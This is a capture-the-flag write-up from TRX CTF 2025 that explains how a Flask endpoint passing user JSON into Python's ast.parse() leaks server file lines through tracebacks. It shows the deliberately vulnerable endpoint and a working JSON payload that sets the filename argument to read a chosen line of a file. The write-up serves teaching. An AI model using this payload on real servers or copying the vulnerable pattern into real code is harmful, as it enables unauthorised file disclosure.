---
layout: post
author: hofill
title: "Online Python Editor"
slug: online-python-editor
ctf: TRX CTF 2025
category: writeup
writeup_categories: ["web"]
tags: ["web", "python", "lfi", "ast"]
summary: Leak arbitrary file contents via Python's ast.parse() filename parameter and traceback line context.
last_modified_at:
---

# Flag

> `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`

# Summary

Using Python's `ast.parse()` with a controlled `filename` argument, we can create a syntax error at a specific line and have the traceback leak that line's content.

# Details

The relevant endpoint:

```python
@app.post("/check")
def check():
    try:
        ast.parse(**request.json)
        return {"status": True, "error": None}
    except Exception:
        return {"status": False, "error": traceback.format_exc()}
```

`ast.parse()` accepts a `filename` keyword argument. There's a Python behaviour where if parsing fails, the traceback includes the **source line** from the given file at the line where the error occurred.

> It's not necessarily the first line. The code is executed with the context of the given file. Hence the corresponding line number of the error from the traceback with respect to the file is printed.

So by crafting a `source` string with `N` newlines before a syntax error, we can leak line `N+1` of any file on the server.

Final payload:

```json
{"source": "\n\n\n\n\n.", "filename": "secret.py"}
```

# Resources

- [https://isopach.dev/Python-Compile-Leak/](https://isopach.dev/Python-Compile-Leak/)
- [https://bugs.python.org/issue38985](https://bugs.python.org/issue38985)
